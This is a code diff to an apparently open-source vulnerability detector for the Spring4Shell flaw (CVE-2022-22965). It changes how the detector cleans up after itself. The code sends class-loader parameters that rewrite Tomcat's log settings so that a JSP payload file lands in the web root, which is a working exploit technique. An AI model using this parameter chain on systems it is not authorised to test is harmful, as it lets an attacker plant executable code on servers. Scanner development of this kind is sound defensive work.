@@ -75,7 +75,7 @@ public final class SpringCve202222965Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
   private static final String PRELIMINARY_CHECK_PARAM =
       "class.module.classLoader.DefaultAssertionStatus";
-  // A payload to append to the JSP file that will allow to delete the file itself
+  // This JSP payload auto-deletes itself if you open it with "?delete=1"
   private static final String JSP_CONTENT_TEMPLATE =
           "<%@ page import=\"java.io.File\" %>\n{{PAYLOAD}}\n<% if(\"1\".equals(request.getParameter(\"delete\"))){ File thisFile=new File(application.getRealPath(request.getServletPath())); thisFile.delete(); out.println(\"Deleted\"); } %>//";
 
@@ -84,15 +84,21 @@ public final class SpringCve202222965Detector implements VulnDetector {
   private static final String JSP_FILENAME_PREFIX = "Tsunami_";
   private static final String JSP_FILENAME = JSP_FILENAME_PREFIX + JSP_FILENAME_SUFFIX;
 
+  private static final String LOG_PATTERN_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.pattern";
+
   private static final Map<String, String> LOG_CONFIG_PARAMS = ImmutableMap.of(
           "class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".jsp",
           "class.module.classLoader.resources.context.parent.pipeline.first.directory", "webapps/ROOT",
           "class.module.classLoader.resources.context.parent.pipeline.first.prefix", JSP_FILENAME_PREFIX,
           "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", JSP_FILENAME_SUFFIX
   );
-  private static final String LOG_FILE_DATE_FORMAT_QS = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_";
-  private static final String LOG_PATTERN_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.pattern";
-
+  private static final Map<String, String> LOG_CONFIG_PARAMS_NULL = ImmutableMap.of(
+          "class.module.classLoader.resources.context.parent.pipeline.first.suffix", "",
+          "class.module.classLoader.resources.context.parent.pipeline.first.directory", "/dev",
+          "class.module.classLoader.resources.context.parent.pipeline.first.prefix", "null",
+          "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", "",
+          LOG_PATTERN_PARAM, ""
+  );
 
   private final Clock utcClock;
   private final HttpClient httpClient;
@@ -214,7 +220,7 @@ public final class SpringCve202222965Detector implements VulnDetector {
 
     try {
       // Generate JSP content
-      logger.atInfo().log("Setting log configuration to write JSP file.");
+      logger.atInfo().log("Changing the log configuration to write the JSP file.");
       String jspContent = JSP_CONTENT_TEMPLATE
               .replace("{{PAYLOAD}}", payload.getPayload())
               .replace("%", "%{perc}i")
@@ -256,12 +262,13 @@ public final class SpringCve202222965Detector implements VulnDetector {
       // Wait for file to be written
       Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));
 
-      // Reset the pattern to prevent further data being written to the file
+      // Set the log file to /dev/null to prevent further data being written to the file
+      // or accidentally leaving leftovers on the target
       logger.atInfo().log("Resetting log configuration.");
       httpClient.send(
               HttpRequest.builder()
                       .setMethod(httpMethod)
-                      .setUrl(targetUri + "?" + LOG_PATTERN_PARAM + "=")
+                      .setUrl(targetUri + "?" + buildQueryString(LOG_CONFIG_PARAMS_NULL))
                       .setHeaders(httpHeaders)
                       .build(),
               networkService
